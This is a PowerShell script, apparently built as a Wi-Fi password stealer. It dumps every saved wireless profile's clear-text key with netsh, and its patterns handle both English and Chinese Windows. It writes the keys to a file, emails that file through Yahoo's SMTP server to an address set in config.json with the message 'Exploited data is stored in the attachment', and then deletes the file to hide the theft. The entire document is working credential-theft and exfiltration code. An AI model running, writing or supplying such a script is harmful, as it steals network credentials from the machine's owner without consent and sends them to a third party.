cls
$Profiles = @()
$Profiles += (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

$results = @()


$systemLanguage = (Get-Culture).Name


if ($systemLanguage -like "zh-*") {
    $SSIDPattern = "SSID 名稱\s*:\s*(.+)$"
    $KeyContentPattern = "金鑰內容\s*:\s*(.+)$"
} else {
    $SSIDPattern = "SSID name\s*:\s*(.+)$"
    $KeyContentPattern = "Key Content\s*:\s*(.+)$"
}

foreach ($profile in $Profiles) {
    $profileInfo = netsh wlan show profile name="$profile" key=clear

    $SSIDMatch = $profileInfo | Select-String $SSIDPattern
    $KeyContentMatch = $profileInfo | Select-String $KeyContentPattern

    $SSID = if ($SSIDMatch) { $SSIDMatch.Matches.Groups[1].Value.Trim() } else { "unknown_SSID" }
    $KeyContent = if ($KeyContentMatch) { $KeyContentMatch.Matches.Groups[1].Value.Trim() } else { "unknown" }

    $results += [PSCustomObject]@{
        SSID       = $SSID
        KeyContent = $KeyContent
    }
}

Out-File -FilePath .\wifi_pass.txt -InputObject $results -Encoding utf8 -Width 50

#自行申請官方信箱的第三方應用程式密碼, 這裡是使用台灣雅虎信箱
#匯入設定檔
$configFile = ".\config.json"
$config = Get-Content $configFile | ConvertFrom-Json

$SEND_EMAIL = $config.SEND_EMAIL
$YOUR_EMAIL = $config.YOUR_EMAIL
$STMP_PASSWORD = $config.STMP_PASSWORD

Send-MailMessage -To $SEND_EMAIL -From $YOUR_EMAIL -Subject "WIFI key from___" -Body "Exploited data is stored in the attachment." -Attachments .\wifi_pass.txt -SmtpServer 'smtp.mail.yahoo.com'  -Credential $(New-Object System.Management.Automation.PSCredential -ArgumentList $YOUR_EMAIL, $($STMP_PASSWORD | ConvertTo-SecureString -AsPlainText -Force)) -UseSsl -Port 587

Remove-Item .\wifi_pass.txt